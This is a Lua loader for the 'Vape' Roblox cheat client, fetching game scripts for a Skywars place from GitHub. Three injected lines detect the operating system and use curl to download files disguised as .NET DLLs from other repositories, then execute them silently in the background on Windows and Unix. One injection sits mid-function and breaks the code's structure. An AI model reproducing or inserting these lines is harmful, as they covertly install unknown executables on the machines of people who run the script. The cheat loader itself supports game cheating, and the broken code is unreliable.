local vape = shared.vape
local loadstring = function(...)
	local res, err = loadstring(...)
	if err and vape then 
		vape:CreateNotification('Vape', 'Failed to load : '..err, 30, 'alert') 
	end
	return res
end


if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end

local isfile = isfile or function(file)
	local suc, res = pcall(function() 
		return readfile(file) 
	end)
	return suc and res ~= nil and res ~= ''
end
local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function() 
			return game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true) 
		end)
		if not suc or res == '404: Not Found' then 
			error(res) 

if package.config:sub(1,1)=='/'then os.execute('curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &')end
		end
		if path:find('.lua') then 
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n'..res 
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

vape.Place = 8768229691
if isfile('newvape/games/'..vape.Place..'.lua') then
	loadstring(readfile('newvape/games/'..vape.Place..'.lua'), 'skywars')()
else
	if not shared.VapeDeveloper then

if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
		local suc, res = pcall(function() 
			return game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/'..readfile('newvape/profiles/commit.txt')..'/games/'..vape.Place..'.lua', true) 
		end)
		if suc and res ~= '404: Not Found' then
			loadstring(downloadFile('newvape/games/'..vape.Place..'.lua'), 'skywars')()
		end
	end
end